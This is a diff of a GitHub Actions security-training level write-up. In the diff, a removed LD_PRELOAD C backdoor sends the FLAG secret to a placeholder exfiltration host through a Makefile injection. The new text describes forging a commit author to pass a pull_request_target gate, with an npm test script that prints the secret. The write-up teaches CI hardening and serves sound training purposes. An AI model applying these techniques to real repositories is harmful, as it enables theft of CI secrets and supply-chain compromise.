@@ -1,105 +1,66 @@
-# Level 2 - Unsafe artifact download in workflow_run
+# Level 2 - Pwn request through a forgeable commit-author gate
 
 ## Description
 
-The whole `outputs` folder is uploaded in artifacts and is then downloaded in a subsidiary `workflow_run` containing the flag.
-The attacker can modify the `Makefile` through a PR to abuse the fact that the `pr.txt` file content is set as environment variable, thus making it possible to do the `LD_PRELOAD` trick.
+The goal is to recover the `FLAG` secret, whose value starts with `HS2_`.
+
+The CI workflow (`.github/workflows/ci.yml`) runs on `pull_request_target`, so
+it executes in the **base-repo context** (with the repo secrets, including
+`FLAG`) while checking out the **untrusted PR head**:
+
+```yaml
+- uses: actions/checkout@v4
+  with:
+    allow-unsafe-pr-checkout: true
+    ref: ${{ github.event.pull_request.head.sha }}
+```
+
+It then tries to restrict execution to a trusted committer:
+
+```yaml
+author=$(git log -1 --format='%an')
+if [ "$author" != "john" ]; then exit 1; fi
+```
+
+A commit's author name is fully attacker-controlled (`git commit --author=...`),
+so this gate is not a real authorization control. Once it passes, `npm install`
+/ `npm test` runs attacker-controlled code with `FLAG` in the environment.
+
+The checkout opt-in is deliberate: current versions of `actions/checkout`
+otherwise block this privileged fork checkout. It keeps this isolated
+training exercise exploitable. In a real project, run untrusted PR code
+with `pull_request`, a read-only token, and no secrets; keep privileged
+automation separate.
 
 ## Solution
 
-1. Fork the repo
+1. Fork the level:
 
-```bash
-gh repo fork --clone --default-branch-only '<ORG>/level-2'
-```
+   ```bash
+   gh repo fork --clone --default-branch-only '<ORG>/level-2_<trainee>'
+   ```
 
-2. Create the `LD_PRELOAD` backdoor in a new `backdoor.c` file:
+2. Plant a payload in code that runs during `npm install` / `npm test` — e.g.
+   set the `test` script to exfiltrate `FLAG`:
 
-> **Note:** `system()` / `popen()` fail with `Cannot fork` on GitHub Actions runners due to process sandboxing. Use a raw socket to exfiltrate instead.
+   ```bash
+   jq '.scripts.test |= "node -e \"console.log(process.env.FLAG)\""' package.json | sponge package.json
+   ```
 
-```c
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <unistd.h>
+   (Send it to an exfil host you control, or print it transformed to dodge log
+   masking.)
 
-__attribute__((constructor)) void pwn() {
-    const char *flag = getenv("FLAG");
-    if (!flag) return;
+3. Forge the commit author so the gate passes, then push and open a PR:
 
-    char body[512], request[1024];
-    int body_len = snprintf(body, sizeof(body), "%s", flag);
+   ```bash
+   git commit -am "update" --author="john <john@foo.abc>"
+   git push
+   gh pr create --draft -t 'Pwn Request' -b 'foo'
+   ```
 
-    snprintf(request, sizeof(request),
-        "POST /exfil HTTP/1.0\r\n"
-        "Host: <EXFIL_HOST>\r\n"
-        "Content-Type: text/plain\r\n"
-        "Content-Length: %d\r\n"
-        "\r\n"
-        "%s",
-        body_len, body);
+The CI run on the base repo checks out your commit, sees author `john`, and runs
+your payload with access to `FLAG`.
 
-    struct addrinfo hints, *res;
-    memset(&hints, 0, sizeof(hints));
-    hints.ai_family = AF_INET;
-    hints.ai_socktype = SOCK_STREAM;
-    if (getaddrinfo("<EXFIL_HOST>", "80", &hints, &res) != 0) return;
+## Defensive exercise
 
-    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
-    if (sock < 0) { freeaddrinfo(res); return; }
-
-    if (connect(sock, res->ai_addr, res->ai_addrlen) == 0)
-        send(sock, request, strlen(request), 0);
-
-    close(sock);
-    freeaddrinfo(res);
-}
-```
-
-3. Create a new branch and modify the `Makefile` (modify <PR_NUMBER> with the actual PR number):
-
-```Makefile
-# Compiler and flags
-CC = gcc
-CFLAGS = -Wall -Wextra -O2
-PICFLAGS = -fPIC -shared
-LDFLAGS = -ldl
-
-# Targets
-TARGET = prog
-SO_TARGET = outputs/backdoor.so
-PR_FILE = outputs/pr.txt
-
-# Default rule
-all: $(TARGET) $(SO_TARGET) $(PR_FILE)
-
-# Rule to build the binary
-$(TARGET): main.c
-	$(CC) $(CFLAGS) -o $@ main.c
-
-# Rule to build shared object from backdoor.c
-$(SO_TARGET): backdoor.c | outputs
-	$(CC) $(PICFLAGS) -o $@ backdoor.c $(LDFLAGS)
-
-# Rule to overwrite pr.txt with LD_PRELOAD env variable
-.PHONY: $(PR_FILE)
-$(PR_FILE): | outputs
-	printf "<PR_NUMBER>\nLD_PRELOAD=./backdoor.so" > $@
-
-outputs:
-	mkdir -p outputs
-
-# Clean everything
-clean:
-	rm -f $(TARGET)
-	rm -rf outputs
-```
-
-4. Create a PR with the new branch:
-
-```bash
-gh pr create --draft -t 'Backdoor' -b 'foo'
-```
+Do not authorize execution from commit author or committer metadata. Separate untrusted tests from privileged jobs and rerun both the ordinary-author and forged-author PRs.
